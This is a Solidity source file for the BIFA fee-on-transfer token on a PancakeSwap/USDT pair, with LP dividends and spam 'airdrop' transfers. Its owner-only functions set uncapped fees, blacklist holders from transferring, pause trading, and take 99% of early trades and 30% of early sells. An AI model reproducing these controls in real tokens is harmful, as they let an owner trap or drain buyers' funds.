// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function totalSupply() external view returns (uint256);

    function kLast() external view returns (uint256);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

library Math {
    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract BIFA is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private immutable _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public immutable _tokenDistributor;

    uint256 public _buyDestroyFee = 100; 
    uint256 public _buyFundFee = 100; 
    uint256 public _buyLPDividendFee = 100; 
    uint256 public _buyLPFee = 100;

    uint256 public _sellDestroyFee = 100;
    uint256 public _sellFundFee = 100;
    uint256 public _sellLPDividendFee = 100;
    uint256 public _sellLPFee = 100;

    uint256 public _transferFee = 100;

    uint256 public startAddLPBlock;
    uint256 public startBWBlock;

    address public _mainPair;

    uint256 public _limitAmount;
    uint256 public _txLimitAmount;
    uint256 public _minTotal;

    address public _receiveAddress;

    uint256 public _airdropLen = 2;
    uint256 private constant _airdropAmount = 1e15;

    uint256 public _removeLPFee = 100;
    address public _lpFeeReceiver;

    uint256 private constant _killSec = 15;
    uint256 public _rewardHoldCondition;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _name = "BIFA";
        _symbol = "BIFA";
        _decimals = 18;
        address ReceiveAddress = 0x5f10D360a4C341C5885aE8F3BBb22a3F0AF89E3E;
        address FundAddress = 0x1C39Da87d5AEe43b9Db33F9F2c4f71229143261D;
        ISwapRouter swapRouter = ISwapRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        address usdt = 0x55d398326f99059fF775485246999027B3197955;
        IERC20(usdt).approve(address(swapRouter), MAX);

        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;


        uint256 tokenUnit = 10**_decimals;
        uint256 total = 100000000 * tokenUnit;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _receiveAddress = ReceiveAddress;
        _lpFeeReceiver = ReceiveAddress;
        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;

        _limitAmount = 0;
        _txLimitAmount = 0;

        _tokenDistributor = new TokenDistributor(usdt);
        _feeWhiteList[address(_tokenDistributor)] = true;

        _minTotal = 1 * 10**_decimals;

        excludeHolder[address(0)] = true;
        excludeHolder[
            address(0x000000000000000000000000000000000000dEaD)
        ] = true;
        holderRewardCondition = 50*1e18;
        _rewardHoldCondition = 0 * tokenUnit;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return
            _tTotal -
            _balances[address(0)] -
            _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public goMoonBlock;

    function goMoon() external onlyOwner {
        require(0 == goMoonBlock, "trading");
        goMoonBlock = block.timestamp;
    }
    function setStartTime(uint newval)external onlyOwner {
        goMoonBlock = newval;
    }
    function returnMoon() external onlyOwner {
        goMoonBlock = 0;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from] || _feeWhiteList[from], "BL");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "BNE");
        bool takeFee;
        bool isAddLP;
        bool isRemoveLP;
        if (inSwap) {
            _funTransfer(from, to, amount, 0);
            return;
        }
        if (_mainPair == address(0)) {
            ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
            address usdtPair = swapFactory.getPair(address(this), _usdt);
            _swapPairList[usdtPair] = true;
            _mainPair = usdtPair;
        }
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = (balance * 99999) / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;

            if (_txLimitAmount > 0) {
                require(_txLimitAmount >= amount, "txLimit");
            }
            amount -= _airdropLen * _airdropAmount;
            _airdrop(from, to, amount);
        }

        uint256 addLPLiquidity;
        if (to == _mainPair) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                isAddLP = true;
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            removeLPLiquidity = _isRemoveLiquidity(amount);
            if (removeLPLiquidity > 0) {
                isRemoveLP = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock || goMoonBlock>block.timestamp) {
                        require(0 < startAddLPBlock && isAddLP, "!Trade");
                } else {
                    if (
                        !isAddLP &&
                        !isRemoveLP &&
                        block.timestamp < goMoonBlock + _killSec
                    ) {
                        _funTransfer(from, to, amount, 99);
                        return;
                    }
                }
            }
        }

        if (isAddLP && goMoonBlock == 0) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLP || isAddLP);

        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "Limit");
        }

        if (from != address(this)) {
            if (isAddLP) {
                addHolder(from);
            } else if (!_feeWhiteList[from]) {
                uint256 rewardGas = _rewardGas;
                processReward(rewardGas);
            }
        }
    }

    address private lastAirdropAddress;

    function _airdrop(
        address from,
        address to,
        uint256 tAmount
    ) private {
        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^
            (uint160(from) ^ uint160(to));
        address airdropAddress;
        uint256 num = _airdropLen;
        uint256 airdropAmount = _airdropAmount;
        for (uint256 i; i < num; ) {
            airdropAddress = address(uint160(seed | tAmount));
            _balances[airdropAddress] += airdropAmount;
            emit Transfer(airdropAddress, airdropAddress, airdropAmount);
            unchecked {
                ++i;
                seed = seed >> 1;
            }
        }
        lastAirdropAddress = airdropAddress;
    }

    function _isAddLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply *
                        (rootK - rootKLast) *
                        8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (
            uint256 rOther,
            uint256 rThis,
            uint256 balanceOther
        )
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    function _isRemoveLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply() + 1) /
                (balanceOf(_mainPair) - amount - 1);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * fee) / 100;
        if (feeAmount > 0) {
            _takeTransfer(sender, fundAddress, feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 destroyFeeAmount;
            uint256 swapFeeAmount;
            if (isRemoveLP) {
                feeAmount = (tAmount * _removeLPFee) / 10000;
                _takeTransfer(sender, _lpFeeReceiver, feeAmount);
            } else if (_swapPairList[sender]) {
                //Buy
                destroyFeeAmount = (tAmount * _buyDestroyFee) / 10000;
                swapFeeAmount =
                    (tAmount * (_buyFundFee + _buyLPDividendFee + _buyLPFee)) /
                    10000;
            } else if (_swapPairList[recipient]) {
                //Sell
                // isSell = true;
                destroyFeeAmount = (tAmount * _sellDestroyFee) / 10000;
                // swapFeeAmount = tAmount * (_sellFundFee + _sellFundFee2 + _sellLPDividendFee + _sellLPFee + _sellLPDividendLPFee + _sellHolderOrderDividendFee) / 10000;
                isSell = true;
                uint256 blockNum = block.timestamp;
                if (blockNum - goMoonBlock <= highTax) {
                    swapFeeAmount = (tAmount * 3000) / 10000;
                } else {
                    swapFeeAmount =
                        (tAmount *
                            (_sellFundFee +
                                _sellLPDividendFee +
                                _sellLPFee)) /
                        10000;
                }
            } else {
                //Transfer
                address tokenDistributor = address(_tokenDistributor);
                feeAmount = (tAmount * _transferFee) / 10000;
                if (feeAmount > 0) {
                    _takeTransfer(sender, tokenDistributor, feeAmount);
                    if (goMoonBlock > 0 && !inSwap) {
                        uint256 swapAmount = 2 * feeAmount;
                        uint256 contractTokenBalance = balanceOf(
                            tokenDistributor
                        );
                        if (swapAmount > contractTokenBalance) {
                            swapAmount = contractTokenBalance;
                        }
                        _tokenTransfer(
                            tokenDistributor,
                            address(this),
                            swapAmount,
                            false,
                            false
                        );
                    }
                }
            }
            if (destroyFeeAmount > 0) {
                uint256 destroyAmount = destroyFeeAmount;
                uint256 currentTotal = totalSupply();
                uint256 maxDestroyAmount;
                if (currentTotal > _minTotal) {
                    maxDestroyAmount = currentTotal - _minTotal;
                }
                if (destroyAmount > maxDestroyAmount) {
                    destroyAmount = maxDestroyAmount;
                }
                if (destroyAmount > 0) {
                    feeAmount += destroyAmount;
                    _takeTransfer(
                        sender,
                        address(0x000000000000000000000000000000000000dEaD),
                        destroyAmount
                    );
                }
            }
            if (swapFeeAmount > 0) {
                feeAmount += swapFeeAmount;
                _takeTransfer(sender, address(this), swapFeeAmount);
                if (isSell && !inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    uint256 numTokensSellToFund = (swapFeeAmount * 230) / 100;
                    if (numTokensSellToFund > contractTokenBalance) {
                        numTokensSellToFund = contractTokenBalance;
                    }
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 fundFee = _buyFundFee + _sellFundFee;
        uint256 lpDividendFee = _buyLPDividendFee + _sellLPDividendFee;
        uint256 lpFee = _buyLPFee + _sellLPFee;
        uint256 totalLPFee = lpFee;
        uint256 totalFee = fundFee + lpDividendFee + totalLPFee;

        totalFee += totalFee;

        uint256 lpAmount = (tokenAmount * totalLPFee) / totalFee;
        totalFee -= totalLPFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        usdtBalance = USDT.balanceOf(address(_tokenDistributor)) - usdtBalance;
        // uint256 holderOrderDividendUsdt = usdtBalance * 2 * holderOrderDividendFee / totalFee;
        USDT.transferFrom(
            address(_tokenDistributor),
            address(this),
            usdtBalance
        );

        uint256 fundUsdt = (usdtBalance * fundFee * 2) / totalFee;
        if (fundUsdt > 0) {
            USDT.transfer(fundAddress, fundUsdt);
        }

        uint256 lpUsdt = (usdtBalance * totalLPFee) / totalFee;
        if (lpUsdt > 0) {
            (, , uint256 liquidity) = _swapRouter.addLiquidity(
                address(this),
                _usdt,
                lpAmount,
                lpUsdt,
                0,
                0,
                address(this),
                block.timestamp
            );
            uint256 lpFeeAmount = (liquidity * lpFee) / totalLPFee;
            if (lpFeeAmount > 0) {
                IERC20(_mainPair).transfer(_receiveAddress, lpFeeAmount);
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setReceiveAddress(address addr) external onlyOwner {
        _receiveAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuyFee(
        uint256 buyDestroyFee,
        uint256 buyFundFee,
        uint256 lpFee,
        uint256 lpDividendFee
    ) external onlyOwner {
        _buyDestroyFee = buyDestroyFee;
        _buyFundFee = buyFundFee;
        _buyLPDividendFee = lpDividendFee;
        _buyLPFee = lpFee;
    }

    function setSellFee(
        uint256 sellDestroyFee,
        uint256 sellFundFee,
        uint256 lpFee,
        uint256 lpDividendFee
    ) external onlyOwner {
        _sellDestroyFee = sellDestroyFee;
        _sellFundFee = sellFundFee;
        _sellLPDividendFee = lpDividendFee;
        _sellLPFee = lpFee;
    }

    function setTransferFee(uint256 fee) external onlyOwner {
        _transferFee = fee;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function batchSetBlackList(address[] memory addr, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }


    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external onlyOwner {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(fundAddress, amount);
    }

    function setLimitAmount(uint256 amount) external onlyOwner {
        _limitAmount = amount;
    }

    function setTxLimitAmount(uint256 amount) external onlyOwner {
        _txLimitAmount = amount;
    }

    uint256 public highTax=18;

    function sethighTax(uint256 newval) public onlyOwner {
        highTax = newval;
    }

    function setRewardHoldCondition(uint256 amount) external onlyOwner {
        _rewardHoldCondition = amount * 10**_decimals;
    }

    receive() external payable {}

    function setMinTotal(uint256 total) external onlyOwner {
        _minTotal = total * 10**_decimals;
    }

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function getHolderLength() public view returns (uint256) {
        return holders.length;
    }

    function addHolder(address adr) private {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderRewardCondition;
    uint256 public holderCondition = 1000000;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 1;

    function processReward(uint256 gas) private {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }

        IERC20 usdt = IERC20(_usdt);

        uint256 rewardCondition = holderRewardCondition;
        if (usdt.balanceOf(address(this)) < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint256 holdTokenTotal = holdToken.totalSupply();
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 lpBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;
        uint256 rewardHoldCondition = _rewardHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            if (!excludeHolder[shareHolder]) {
                lpBalance = holdToken.balanceOf(shareHolder);

                if (
                    lpBalance >= holdCondition &&
                    balanceOf(shareHolder) >= rewardHoldCondition
                ) {
                    amount = (rewardCondition * lpBalance) / holdTokenTotal;
                    if (amount > 0) {
                        usdt.transfer(shareHolder, amount);
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = blockNum;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setProgressRewardBlockDebt(uint256 blockDebt) external onlyOwner {
        progressRewardBlockDebt = blockDebt;
    }

    function setAirdropLen(uint256 len) external onlyOwner {
        _airdropLen = len;
    }

    function setLPFeeReceiver(address adr) external onlyOwner {
        _lpFeeReceiver = adr;
        _feeWhiteList[adr] = true;
    }

    function setRemoveLPFee(uint256 fee) external onlyOwner {
        _removeLPFee = fee;
    }

    uint256 public _rewardGas = 500000;

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "20-200w");
        _rewardGas = rewardGas;
    }
}